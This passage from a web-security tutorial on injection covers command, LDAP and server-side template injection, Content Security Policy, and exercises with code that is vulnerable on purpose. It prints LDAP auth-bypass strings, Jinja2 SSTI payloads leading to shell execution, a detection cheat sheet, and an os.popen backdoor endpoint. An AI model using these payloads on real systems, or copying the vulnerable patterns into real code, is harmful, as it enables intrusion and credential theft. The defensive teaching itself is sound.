        return jsonify({"error": "Hostname too long"}), 400

    # Defense 3: Use subprocess with list arguments (no shell)
    try:
        result = subprocess.run(
            ["ping", "-c", "4", host],  # List form: NO shell interpretation
            capture_output=True,
            text=True,
            timeout=10,  # Prevent hanging
        )
        return jsonify({"output": result.stdout})
    except subprocess.TimeoutExpired:
        return jsonify({"error": "Command timed out"}), 408


@app.route('/api/lookup-secure', methods=['POST'])
def lookup_secure():
    """FIXED: Use library instead of shell command."""
    domain = request.json.get('domain', '')

    # Defense 1: Input validation
    if not re.match(r'^[a-zA-Z0-9.\-]+$', domain):
        return jsonify({"error": "Invalid domain"}), 400

    # Defense 2: Use Python library instead of shell command
    import socket
    try:
        result = socket.getaddrinfo(domain, None)
        ips = list(set(addr[4][0] for addr in result))
        return jsonify({"domain": domain, "addresses": ips})
    except socket.gaierror:
        return jsonify({"error": "DNS resolution failed"}), 400


@app.route('/api/resize-image-secure', methods=['POST'])
def resize_image_secure():
    """FIXED: Safe command with shlex.quote for unavoidable shell usage."""
    filename = request.json.get('filename', '')
    width = request.json.get('width', 800)

    # Validate filename (no path traversal)
    if not re.match(r'^[a-zA-Z0-9_\-]+\.(jpg|png|gif)$', filename):
        return jsonify({"error": "Invalid filename"}), 400

    # Validate width
    if not isinstance(width, int) or not (1 <= width <= 4096):
        return jsonify({"error": "Invalid width"}), 400

    # If you MUST use shell (avoid if possible), use shlex.quote
    safe_filename = shlex.quote(filename)
    safe_width = str(int(width))

    # But prefer list form:
    result = subprocess.run(
        ["convert", f"uploads/{filename}", "-resize", f"{safe_width}x",
         f"resized/{filename}"],
        capture_output=True,
        text=True,
        timeout=30,
    )

    if result.returncode != 0:
        return jsonify({"error": "Conversion failed"}), 500

    return jsonify({"status": "resized"})
```

### 5.3 Command Injection Prevention Rules

```
┌─────────────────────────────────────────────────────────────────┐
│          Command Injection Prevention                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. AVOID shell commands entirely                                │
│     Use Python libraries instead:                                │
│     - os.system("ping X")  → subprocess.run(["ping", X])       │
│     - os.system("nslookup")→ socket.getaddrinfo()              │
│     - os.system("convert") → Pillow library                     │
│     - os.system("curl")    → requests library                   │
│                                                                  │
│  2. If shell is unavoidable:                                     │
│     - Use subprocess.run() with list arguments                  │
│     - NEVER use shell=True                                      │
│     - Use shlex.quote() as last resort                          │
│     - Set timeout                                                │
│                                                                  │
│  3. Validate input:                                              │
│     - Whitelist allowed characters (alphanumeric + limited set) │
│     - Validate against expected format (IP, domain, filename)   │
│     - Reject any input with shell metacharacters                │
│                                                                  │
│  4. Principle of least privilege:                                │
│     - Run application with minimal OS permissions               │
│     - Use containers/sandboxes for command execution             │
│     - Drop capabilities (no network, no filesystem write)       │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 6. LDAP Injection

### 6.1 How LDAP Injection Works

LDAP (Lightweight Directory Access Protocol) injection occurs when user input is used to construct LDAP queries without proper sanitization, similar to SQL injection but targeting directory services.

```
┌─────────────────────────────────────────────────────────────────┐
│              LDAP Injection                                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Normal LDAP query:                                              │
│  (&(uid=alice)(userPassword=secret123))                         │
│                                                                  │
│  Attack (bypass authentication):                                 │
│  Username: alice)(|(uid=*                                        │
│  Password: anything                                              │
│                                                                  │
│  Resulting query:                                                │
│  (&(uid=alice)(|(uid=*)(userPassword=anything))                 │
│                                                                  │
│  This matches ANY user because (uid=*) is always true           │
│                                                                  │
│  LDAP Special Characters:                                        │
│  *    → Wildcard (any value)                                    │
│  (    → Filter group start                                      │
│  )    → Filter group end                                        │
│  \    → Escape character                                        │
│  NUL  → Null byte                                               │
│  /    → DN separator                                            │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 6.2 Vulnerable and Fixed Code

```python
"""
ldap_injection.py - LDAP injection vulnerability and prevention
"""
import ldap3
import re
from flask import Flask, request, jsonify

app = Flask(__name__)

LDAP_SERVER = "ldap://ldap.example.com"
LDAP_BASE_DN = "dc=example,dc=com"


# ==============================================================
# VULNERABLE: String concatenation in LDAP query
# ==============================================================

@app.route('/api/ldap-login-vulnerable', methods=['POST'])
def ldap_login_vulnerable():
    username = request.json['username']
    password = request.json['password']

    # VULNERABLE: Direct string interpolation
    search_filter = f"(&(uid={username})(userPassword={password}))"

    server = ldap3.Server(LDAP_SERVER)
    conn = ldap3.Connection(server, auto_bind=True)
    conn.search(LDAP_BASE_DN, search_filter)

    if conn.entries:
        return jsonify({"status": "authenticated"})
    return jsonify({"error": "Invalid credentials"}), 401

# Attack: username = "*)(|(uid=*"  → Bypasses authentication


# ==============================================================
# FIXED: Input sanitization for LDAP
# ==============================================================

def ldap_escape(value: str) -> str:
    """
    Escape special characters for LDAP filter strings.
    Per RFC 4515, section 3.
    """
    escaped = value.replace('\\', '\\5c')  # Must be first
    escaped = escaped.replace('*', '\\2a')
    escaped = escaped.replace('(', '\\28')
    escaped = escaped.replace(')', '\\29')
    escaped = escaped.replace('\x00', '\\00')
    return escaped


def ldap_dn_escape(value: str) -> str:
    """Escape special characters for LDAP Distinguished Names."""
    special_chars = [',', '\\', '#', '+', '<', '>', ';', '"', '=']
    escaped = value
    for char in special_chars:
        escaped = escaped.replace(char, f'\\{char}')
    # Leading/trailing spaces
    if escaped.startswith(' '):
        escaped = '\\ ' + escaped[1:]
    if escaped.endswith(' '):
        escaped = escaped[:-1] + '\\ '
    return escaped


@app.route('/api/ldap-login-secure', methods=['POST'])
def ldap_login_secure():
    username = request.json.get('username', '')
    password = request.json.get('password', '')

    # Defense 1: Input validation
    if not re.match(r'^[a-zA-Z0-9._-]+$', username):
        return jsonify({"error": "Invalid username format"}), 400

    if len(username) > 64:
        return jsonify({"error": "Username too long"}), 400

    # Defense 2: Escape LDAP special characters
    safe_username = ldap_escape(username)

    # Defense 3: Use LDAP bind for authentication instead of search
    # This is the recommended approach - let LDAP server verify password
    server = ldap3.Server(LDAP_SERVER)
    user_dn = f"uid={ldap_dn_escape(username)},ou=users,{LDAP_BASE_DN}"

    try:
        # LDAP bind attempts to authenticate directly
        conn = ldap3.Connection(
            server, user=user_dn, password=password, auto_bind=True
        )
        conn.unbind()
        return jsonify({"status": "authenticated"})
    except ldap3.core.exceptions.LDAPBindError:
        return jsonify({"error": "Invalid credentials"}), 401
    except ldap3.core.exceptions.LDAPException:
        return jsonify({"error": "Authentication service error"}), 500


@app.route('/api/ldap-search-secure', methods=['GET'])
def ldap_search_secure():
    """Secure LDAP search with properly escaped filters."""
    query = request.args.get('q', '')

    # Validate and escape
    if not query or len(query) > 100:
        return jsonify({"error": "Invalid query"}), 400

    safe_query = ldap_escape(query)

    server = ldap3.Server(LDAP_SERVER)
    conn = ldap3.Connection(server, auto_bind=True)

    # Use escaped value in filter
    search_filter = f"(&(objectClass=person)(|(cn=*{safe_query}*)(mail=*{safe_query}*)))"
    conn.search(LDAP_BASE_DN, search_filter, attributes=['cn', 'mail'])

    results = [{"name": str(e.cn), "email": str(e.mail)} for e in conn.entries]
    conn.unbind()

    return jsonify({"results": results})
```

---

## 7. Server-Side Template Injection (SSTI)

### 7.1 How SSTI Works

SSTI occurs when user input is embedded into a template engine's template string rather than passed as data. The attacker can execute arbitrary code through template directives.

```
┌─────────────────────────────────────────────────────────────────┐
│          Server-Side Template Injection (SSTI)                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Safe (data passed as parameter):                                │
│  render_template("hello.html", name=user_input)                 │
│  Template: <h1>Hello {{ name }}</h1>                            │
│  → User input is treated as data, auto-escaped                  │
│                                                                  │
│  VULNERABLE (user input IN the template):                        │
│  render_template_string(f"<h1>Hello {user_input}</h1>")         │
│  → User input IS the template code!                             │
│                                                                  │
│  Attack payload (Jinja2):                                        │
│  {{ config.items() }}                                            │
│  → Dumps application configuration (SECRET_KEY, DB URI, etc.)   │
│                                                                  │
│  {{ ''.__class__.__mro__[1].__subclasses__() }}                 │
│  → Lists all Python classes (path to RCE)                       │
│                                                                  │
│  {{ ''.__class__.__mro__[1].__subclasses__()[X]('cmd',          │
│       shell=True, stdout=-1).communicate() }}                    │
│  → Remote Code Execution!                                       │
│                                                                  │
│  Template Engines Affected:                                      │
│  - Jinja2 (Python/Flask)                                        │
│  - Twig (PHP)                                                    │
│  - Freemarker (Java)                                            │
│  - Velocity (Java)                                               │
│  - ERB (Ruby)                                                    │
│  - Smarty (PHP)                                                  │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 7.2 Vulnerable and Fixed Code

```python
"""
ssti.py - Server-Side Template Injection vulnerability and prevention
"""
from flask import Flask, request, render_template, render_template_string
from jinja2.sandbox import SandboxedEnvironment

app = Flask(__name__)
app.config['SECRET_KEY'] = 'super-secret-database-key-12345'


# ==============================================================
# VULNERABLE: User input in template string
# ==============================================================

@app.route('/greet-vulnerable')
def greet_vulnerable():
    name = request.args.get('name', 'World')

    # VULNERABLE: User input IS part of the template
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)

# Attack: /greet-vulnerable?name={{ config['SECRET_KEY'] }}
# Result: <h1>Hello super-secret-database-key-12345!</h1>

# Attack: /greet-vulnerable?name={{ ''.__class__.__mro__[1].__subclasses__() }}
# Result: Lists all Python classes, enabling code execution


@app.route('/profile-vulnerable')
def profile_vulnerable():
    # Loading user-created template from database
    user_template = get_user_template(request.args['user_id'])

    # VULNERABLE: User-controlled template content
    return render_template_string(user_template)


# ==============================================================
# VULNERABLE: Template in error page
# ==============================================================

@app.errorhandler(404)
def not_found_vulnerable(error):
    url = request.url
    # VULNERABLE: URL reflected into template string
    template = f"""
    <html>
    <body>
        <h1>Page Not Found</h1>
        <p>The page {url} was not found.</p>
    </body>
    </html>
    """
    return render_template_string(template), 404

# Attack: GET /{{config.items()}}
# The 404 handler renders the template with the config data


# ==============================================================
# FIXED: Pass user input as data, not as template code
# ==============================================================

@app.route('/greet-secure')
def greet_secure():
    name = request.args.get('name', 'World')

    # FIXED: User input passed as data parameter
    # Jinja2 auto-escapes {{ name }} when it's a variable
    return render_template_string(
        "<h1>Hello {{ name }}!</h1>",
        name=name  # This is DATA, not template code
    )

# Input: {{ config['SECRET_KEY'] }}
# Output: <h1>Hello {{ config[&#39;SECRET_KEY&#39;] }}!</h1>
# Rendered as text, not executed!


# BEST: Use separate template files, not render_template_string
@app.route('/greet-best')
def greet_best():
    name = request.args.get('name', 'World')
    return render_template('greet.html', name=name)
    # greet.html: <h1>Hello {{ name }}!</h1>


@app.errorhandler(404)
def not_found_secure(error):
    # FIXED: URL passed as data, not embedded in template
    return render_template_string(
        """
        <html>
        <body>
            <h1>Page Not Found</h1>
            <p>The requested page was not found.</p>
        </body>
        </html>
        """,
    ), 404
    # Note: Don't even include the URL in the error page (information leakage)


# ==============================================================
# If user-generated templates are required: Use Sandbox
# ==============================================================

def render_user_template_safe(template_str: str, context: dict) -> str:
    """
    Render a user-provided template in a sandboxed environment.
    This restricts access to dangerous attributes and methods.
    """
    # Sandboxed environment restricts attribute access
    sandbox = SandboxedEnvironment()

    try:
        template = sandbox.from_string(template_str)
        return template.render(**context)
    except Exception:
        return "<p>Error rendering template</p>"

# The sandbox prevents:
# - Accessing __class__, __mro__, __subclasses__
# - Calling dangerous functions
# - Accessing config or other app internals
# But it's still not 100% safe - prefer to avoid user templates entirely
```

### 7.3 SSTI Detection Cheat Sheet

```
┌─────────────────────────────────────────────────────────────────┐
│          SSTI Detection by Template Engine                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Universal test payload: ${7*7} and {{7*7}}                     │
│  If either renders as "49", the app is vulnerable               │
│                                                                  │
│  Engine-specific detection:                                      │
│  ┌──────────────┬──────────────────────┬─────────┐             │
│  │ Engine       │ Test Payload         │ Output  │              │
│  ├──────────────┼──────────────────────┼─────────┤             │
│  │ Jinja2       │ {{7*'7'}}            │ 7777777 │              │
│  │ Twig         │ {{7*'7'}}            │ 49      │              │
│  │ Freemarker   │ ${7*7}               │ 49      │              │
│  │ ERB (Ruby)   │ <%= 7*7 %>           │ 49      │              │
│  │ Smarty       │ {7*7}                │ 49      │              │
│  │ Velocity     │ #set($x=7*7)${x}    │ 49      │              │
│  └──────────────┴──────────────────────┴─────────┘             │
│                                                                  │
│  Prevention (all engines):                                       │
│  1. Never put user input INTO templates                         │
│  2. Always pass user input AS template variables                │
│  3. Use sandboxed template environments if user templates needed│
│  4. Use logic-less templates (Mustache) if possible             │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 8. Content Security Policy (CSP)

### 8.1 CSP as a Defense Layer

Content Security Policy is an HTTP header that instructs the browser to only load resources from approved sources. It is the most effective defense-in-depth against XSS.

```
┌─────────────────────────────────────────────────────────────────┐
│              Content Security Policy                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Without CSP:                                                    │
│  Any <script> tag executes, including injected ones             │
│  <script>malicious_code()</script>  → RUNS                     │
│                                                                  │
│  With CSP:                                                       │
│  Browser blocks scripts not matching the policy                 │
│  <script>malicious_code()</script>  → BLOCKED                  │
│  (because inline scripts are not in the CSP allowlist)          │
│                                                                  │
│  CSP Directives:                                                │
│  ┌──────────────────┬──────────────────────────────────┐       │
│  │ Directive        │ Controls                          │       │
│  ├──────────────────┼──────────────────────────────────┤       │
│  │ default-src      │ Fallback for all resource types   │       │
│  │ script-src       │ JavaScript sources                │       │
│  │ style-src        │ CSS sources                       │       │
│  │ img-src          │ Image sources                     │       │
│  │ font-src         │ Font sources                      │       │
│  │ connect-src      │ AJAX, WebSocket, EventSource      │       │
│  │ frame-src        │ iframe sources                    │       │
│  │ media-src        │ Audio/Video sources               │       │
│  │ object-src       │ Plugins (Flash, Java)             │       │
│  │ form-action      │ Form submission targets           │       │
│  │ frame-ancestors  │ Who can embed this page           │       │
│  │ base-uri         │ Restricts <base> tag              │       │
│  │ report-uri       │ Where to send violation reports   │       │
│  └──────────────────┴──────────────────────────────────┘       │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 8.2 CSP Implementation

```python
"""
csp_implementation.py - Content Security Policy for Flask
"""
import secrets
from flask import Flask, request, make_response, g

app = Flask(__name__)


# ==============================================================
# Level 1: Basic CSP (good starting point)
# ==============================================================

@app.after_request
def add_csp_basic(response):
    """Basic CSP that blocks most XSS."""
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "          # Only load from same origin
        "script-src 'self'; "           # No inline scripts!
        "style-src 'self'; "            # No inline styles!
        "img-src 'self' data:; "        # Allow data: URIs for images
        "font-src 'self'; "
        "object-src 'none'; "           # No Flash/Java plugins
        "frame-ancestors 'none'; "      # No embedding in iframes
        "base-uri 'self'; "             # Prevent <base> hijacking
        "form-action 'self'"            # Forms only submit to self
    )
    return response


# ==============================================================
# Level 2: CSP with nonces (for inline scripts when needed)
# ==============================================================

@app.before_request
def generate_csp_nonce():
    """Generate a unique nonce for each request."""
    g.csp_nonce = secrets.token_urlsafe(32)


@app.after_request
def add_csp_nonce(response):
    """CSP with nonce-based inline script allowlisting."""
    nonce = getattr(g, 'csp_nonce', '')

    response.headers['Content-Security-Policy'] = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "  # Only scripts with this nonce
        f"style-src 'self' 'nonce-{nonce}'; "
        f"img-src 'self' data: https:; "
        f"font-src 'self' https://fonts.gstatic.com; "
        f"connect-src 'self' https://api.example.com; "
        f"object-src 'none'; "
        f"frame-ancestors 'none'; "
        f"base-uri 'self'; "
        f"form-action 'self'; "
        f"report-uri /api/csp-report"
    )
    return response


# In templates, use the nonce for inline scripts:
"""
<!-- This inline script is ALLOWED because it has the correct nonce -->
<script nonce="{{ g.csp_nonce }}">
    // Legitimate inline script
    document.getElementById('app').textContent = 'Hello';
</script>

<!-- This injected script is BLOCKED (no nonce) -->
<script>
    // XSS payload - blocked by CSP!
    document.cookie;
</script>
"""


# ==============================================================
# Level 3: Strict CSP (Google recommended)
# ==============================================================

@app.after_request
def add_csp_strict(response):
    """Strict CSP based on Google's recommendations."""
    nonce = getattr(g, 'csp_nonce', '')

    response.headers['Content-Security-Policy'] = (
        # strict-dynamic: trust scripts loaded by trusted scripts
        f"script-src 'nonce-{nonce}' 'strict-dynamic' https:; "
        f"object-src 'none'; "
        f"base-uri 'self'; "
        # Report violations
        f"report-uri /api/csp-report"
    )
    return response


# ==============================================================
# CSP Violation Reporting
# ==============================================================

@app.route('/api/csp-report', methods=['POST'])
def csp_report():
    """Receive CSP violation reports."""
    report = request.get_json(force=True)
    violation = report.get('csp-report', {})

    app.logger.warning(
        f"CSP Violation: {violation.get('violated-directive')} "
        f"blocked: {violation.get('blocked-uri')} "
        f"page: {violation.get('document-uri')}"
    )

    return '', 204


# ==============================================================
# Report-Only Mode (for testing before enforcing)
# ==============================================================

@app.after_request
def add_csp_report_only(response):
    """Use Report-Only to test CSP without blocking anything."""
    nonce = getattr(g, 'csp_nonce', '')

    # Content-Security-Policy-Report-Only: logs but doesn't block
    response.headers['Content-Security-Policy-Report-Only'] = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "
        f"report-uri /api/csp-report"
    )
    return response
```

### 8.3 CSP Deployment Strategy

```
┌─────────────────────────────────────────────────────────────────┐
│              CSP Deployment Steps                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Step 1: Report-Only Mode                                        │
│  Deploy with Content-Security-Policy-Report-Only header          │
│  Monitor violation reports for 1-2 weeks                        │
│  Fix legitimate resources that would be blocked                 │
│                                                                  │
│  Step 2: Basic Enforcement                                       │
│  Switch to Content-Security-Policy header                       │
│  Start with permissive policy, tighten gradually                │
│  Keep report-uri to catch issues                                │
│                                                                  │
│  Step 3: Strict Enforcement                                      │
│  Remove 'unsafe-inline' (use nonces instead)                    │
│  Remove 'unsafe-eval'                                           │
│  Add 'strict-dynamic' for script loading                        │
│  Minimize allowed domains                                        │
│                                                                  │
│  Step 4: Maintain                                                │
│  Review CSP reports regularly                                    │
│  Update policy as application evolves                           │
│  Test CSP changes in staging first                              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 9. Defense-in-Depth Summary

```
┌─────────────────────────────────────────────────────────────────┐
│          Defense-in-Depth for Injection                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Layer 1: Input Validation                                       │
│  ├── Whitelist validation (preferred over blacklist)             │
│  ├── Type checking (int, email, URL format)                     │
│  ├── Length limits                                               │
│  └── Character set restrictions                                  │
│                                                                  │
│  Layer 2: Parameterization / Safe APIs                          │
│  ├── Parameterized queries (SQL)                                │
│  ├── Template data parameters (SSTI)                            │
│  ├── subprocess with list args (Command)                        │
│  └── LDAP escape functions (LDAP)                               │
│                                                                  │
│  Layer 3: Output Encoding                                        │
│  ├── HTML entity encoding (XSS in HTML context)                │
│  ├── JavaScript encoding (XSS in JS context)                   │
│  ├── URL encoding (XSS in URL context)                          │
│  └── Context-specific encoding for each output                  │
│                                                                  │
│  Layer 4: Security Headers                                       │
│  ├── Content-Security-Policy (blocks inline scripts)            │
│  ├── X-Content-Type-Options: nosniff                            │
│  ├── X-Frame-Options: DENY                                      │
│  └── Set-Cookie: HttpOnly; Secure; SameSite                    │
│                                                                  │
│  Layer 5: Runtime Protection                                     │
│  ├── Web Application Firewall (WAF)                             │
│  ├── Rate limiting                                               │
│  ├── Anomaly detection                                           │
│  └── Security monitoring and alerting                           │
│                                                                  │
│  No single layer is sufficient. Use ALL layers together.        │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 10. Exercises

### Exercise 1: SQL Injection Lab

Identify the injection vulnerability, write an exploit payload, then fix the code:

```python
"""
Exercise: Find the SQL injection, exploit it, then fix it.
"""
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

@app.route('/api/products')
def search_products():
    category = request.args.get('category', '')
    min_price = request.args.get('min_price', '0')
    max_price = request.args.get('max_price', '99999')
    sort = request.args.get('sort', 'name')

    db = sqlite3.connect('shop.db')
    query = f"""
        SELECT id, name, price, description
        FROM products
        WHERE category = '{category}'
        AND price BETWEEN {min_price} AND {max_price}
        ORDER BY {sort}
    """
    results = db.execute(query).fetchall()
    return jsonify(results)

# Questions:
# 1. How many injection points are there? (Identify each)
# 2. Write a payload to extract all table names from the database
# 3. Write a payload to extract all user passwords
# 4. Fix the code to prevent all injection vectors
```

### Exercise 2: XSS Challenge

Fix all XSS vulnerabilities in this template and backend:

```python
"""
Exercise: Fix ALL XSS vulnerabilities in this blog application.
"""
from flask import Flask, request, render_template_string

app = Flask(__name__)

BLOG_TEMPLATE = """
<html>
<head>
    <title>{{ title }}</title>
    <style>
        .highlight { color: """ + "{{ highlight_color }}" + """; }
    </style>
</head>
<body>
    <h1>Blog Post</h1>

    <!-- Search result -->
    <p>Showing results for: """ + "{{ search_query }}" + """</p>

    <!-- Post content (HTML allowed for formatting) -->
    <div class="content">{{ post_content|safe }}</div>

    <!-- User comment -->
    <div class="comment" data-author="{{ comment_author }}">
        {{ comment_text }}
    </div>

    <!-- Share button -->
    <a href="javascript:share('{{ share_url }}')">Share</a>

    <script>
        var userName = '{{ current_user }}';
        var searchTerm = '{{ search_query }}';
        document.getElementById('welcome').innerHTML =
            'Welcome, ' + userName;
    </script>
</body>
</html>
"""

@app.route('/blog')
def blog():
    return render_template_string(BLOG_TEMPLATE,
        title=request.args.get('title', 'My Blog'),
        highlight_color=request.args.get('color', 'blue'),
        search_query=request.args.get('q', ''),
        post_content=get_post_content(),  # From DB, may contain user HTML
        comment_author=request.args.get('author', ''),
        comment_text=request.args.get('comment', ''),
        share_url=request.args.get('url', ''),
        current_user=get_current_username(),
    )

# Questions:
# 1. Identify ALL XSS vectors (there are at least 6)
# 2. For each, explain what type (reflected, stored, DOM)
# 3. Fix each vulnerability with the appropriate encoding
# 4. Add a Content Security Policy header
```

### Exercise 3: CSRF Protection

Implement complete CSRF protection for this application:

```python
"""
Exercise: Add CSRF protection to all state-changing endpoints.
Implement both token-based and SameSite cookie protection.
"""
from flask import Flask, request, jsonify, render_template_string, session

app = Flask(__name__)
app.secret_key = 'change-me'

# These endpoints need CSRF protection:

@app.route('/transfer', methods=['POST'])
def transfer_money():
    """Transfer money between accounts."""
    from_account = request.form['from']
    to_account = request.form['to']
    amount = request.form['amount']
    # TODO: Add CSRF protection
    return do_transfer(from_account, to_account, amount)

@app.route('/api/profile', methods=['PUT'])
def update_profile():
    """Update user profile via AJAX."""
    data = request.json
    # TODO: Add CSRF protection for AJAX requests
    return update_user_profile(data)

@app.route('/api/delete-account', methods=['DELETE'])
def delete_account():
    """Permanently delete user account."""
    # TODO: Add CSRF protection + additional confirmation
    return delete_user_account(session['user_id'])

# Requirements:
# 1. Implement csrf_protect decorator
# 2. Generate and validate CSRF tokens
# 3. Handle both form submissions and AJAX requests
# 4. Configure SameSite cookies
# 5. Add token to all forms and AJAX calls
```

### Exercise 4: Command Injection Prevention

Rewrite this file management API to be injection-safe:

```python
"""
Exercise: Rewrite ALL endpoints to prevent command injection.
Use Python libraries instead of shell commands where possible.
"""
import os
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/files/list')
def list_files():
    path = request.args.get('path', '.')
    output = os.popen(f'ls -la {path}').read()
    return jsonify({"files": output})

@app.route('/api/files/search')
def search_files():
    pattern = request.args.get('pattern', '*')
    path = request.args.get('path', '.')
    output = os.popen(f'find {path} -name "{pattern}"').read()
    return jsonify({"results": output})

@app.route('/api/files/compress', methods=['POST'])
def compress():
    files = request.json.get('files', [])
    output_name = request.json.get('output', 'archive.tar.gz')
    file_list = ' '.join(files)
    os.system(f'tar czf {output_name} {file_list}')
    return jsonify({"status": "compressed"})

@app.route('/api/system/info')
def system_info():
    command = request.args.get('cmd', 'uname -a')
    output = os.popen(command).read()
    return jsonify({"output": output})

# Requirements:
# 1. Replace shell commands with Python equivalents
# 2. Add input validation for all parameters
# 3. Prevent path traversal attacks
# 4. Remove the system_info endpoint entirely (it's a backdoor!)
```

### Exercise 5: Full Application Security Review

Perform a security review on this application and fix all injection vulnerabilities:

```python
"""
Exercise: This application has at least one vulnerability from each
injection type covered in this lesson:
- SQL Injection
- XSS (Reflected and Stored)
- CSRF
- Command Injection
- SSTI

Find and fix ALL of them. Add defense-in-depth measures including
CSP headers.
"""

from flask import Flask, request, render_template_string, session
import sqlite3
import os

app = Flask(__name__)
app.secret_key = 'dev-key'

@app.route('/search')
def search():
    q = request.args.get('q', '')
    db = sqlite3.connect('app.db')
    results = db.execute(
        f"SELECT * FROM articles WHERE title LIKE '%{q}%'"
    ).fetchall()
    return render_template_string(
        f"<h1>Results for: {q}</h1>" +
        "<ul>{% for r in results %}<li>{{ r[1] }}</li>{% endfor %}</ul>",
        results=results
    )

@app.route('/comment', methods=['POST'])
def add_comment():
    text = request.form['text']
    db = sqlite3.connect('app.db')
    db.execute(f"INSERT INTO comments (text) VALUES ('{text}')")
    db.commit()
    return "Comment added"

@app.route('/preview')
def preview():
    template = request.args.get('template', '<p>Hello</p>')
    return render_template_string(template)

@app.route('/export')
def export():
    filename = request.args.get('file', 'data.csv')
    os.system(f'cp uploads/{filename} /tmp/export_{filename}')
    return "Exported"

@app.route('/profile', methods=['POST'])
def update_profile():
    # No CSRF token check
    bio = request.form['bio']
    db = sqlite3.connect('app.db')
    db.execute(f"UPDATE users SET bio = '{bio}' WHERE id = {session['user_id']}")
    db.commit()
    return "Updated"
```

---

## 11. Summary

```
┌─────────────────────────────────────────────────────────────────┐
│          Injection Attacks and Prevention Summary                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  SQL Injection:                                                  │
│  - Root cause: String concatenation in queries                  │
│  - Fix: Parameterized queries, ORM                              │
│  - Remember: Even data from YOUR database needs parameterization│
│                                                                  │
│  XSS (Cross-Site Scripting):                                    │
│  - Root cause: User input rendered as HTML without encoding     │
│  - Fix: Context-specific output encoding + CSP                  │
│  - Use textContent (not innerHTML) for DOM manipulation          │
│  - Jinja2 auto-escaping + never use |safe with user input      │
│                                                                  │
│  CSRF:                                                           │
│  - Root cause: No verification that request came from our site  │
│  - Fix: CSRF tokens + SameSite cookies + Origin checking       │
│  - Every state-changing endpoint needs protection               │
│                                                                  │
│  Command Injection:                                              │
│  - Root cause: User input in shell commands                     │
│  - Fix: Python libraries (avoid shell), subprocess with lists   │
│  - Never use shell=True with user input                         │
│                                                                  │
│  LDAP Injection:                                                 │
│  - Root cause: String concatenation in LDAP filters             │
│  - Fix: Escape special characters, use LDAP bind for auth      │
│                                                                  │
│  SSTI:                                                           │
│  - Root cause: User input IN template, not AS template data     │
│  - Fix: Pass user input as template variables, not in template  │
│  - Never use render_template_string(f"...{user_input}...")      │
│                                                                  │
│  Defense-in-Depth:                                               │
│  Input Validation → Parameterization → Output Encoding → CSP   │
│  All four layers. No exceptions.                                 │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

**Previous**: [07. OWASP Top 10 (2021)](07_OWASP_Top10.md) | **Next**: [09. Web Security Headers and CSP](./09_Web_Security_Headers.md)
